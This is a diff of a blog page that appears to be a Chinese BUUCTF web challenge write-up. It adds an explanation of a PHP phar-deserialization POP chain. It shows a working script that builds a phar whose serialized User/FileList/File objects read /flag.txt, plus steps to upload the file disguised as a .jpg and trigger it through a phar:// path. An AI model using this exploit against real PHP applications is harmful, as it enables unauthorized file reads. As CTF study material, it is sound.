@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://i.loli.net/2021/06/06/WwTK4CpFVloytAB.png">
 <meta property="og:image" content="https://i.loli.net/2021/06/06/i5qJ6GgQcUAensT.png">
 <meta property="article:published_time" content="2021-06-06T08:33:08.000Z">
-<meta property="article:modified_time" content="2021-06-06T13:03:43.204Z">
+<meta property="article:modified_time" content="2021-06-07T01:38:35.708Z">
 <meta property="article:author" content="honywen">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="BUUCTF">
@@ -208,10 +208,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-06-06 16:33:08 / Modified: 21:03:43" itemprop="dateCreated datePublished" datetime="2021-06-06T16:33:08+08:00">2021-06-06</time>
+              <time title="Created: 2021-06-06 16:33:08" itemprop="dateCreated datePublished" datetime="2021-06-06T16:33:08+08:00">2021-06-06</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-06-07 09:38:35" itemprop="dateModified" datetime="2021-06-07T09:38:35+08:00">2021-06-07</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -292,6 +298,11 @@
 </ol>
 <p>payload如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename&#x3D;$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o &#x3D; new User();</span><br><span class="line">    $o-&gt;db &#x3D;new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先调用了User类，User类destruct的时候，调用了db.close方法，而这里的db是Filelist类的对象，所以调用了Filelist类的close()方法，但是Filelist又不存在这个方法，所以调用了call方法，<br>call方法会调用file的close方法，也就是/flag.txt调用close方法，也就是包含这个文件。最后，Filelist类调用destruct方法，打印出函数执行结果，也就是根目录下flag.txt文件的内容</p>
+<p>_call方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</span><br><span class="line"></span><br><span class="line">该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</span><br></pre></td></tr></table></figure>
+
 
 <p>之后将生成的phar文件后缀改为jpg上传。</p>
 <p>接下来再点击删除文件，将文件名改为phar://phar.jpg即可获得flag</p>
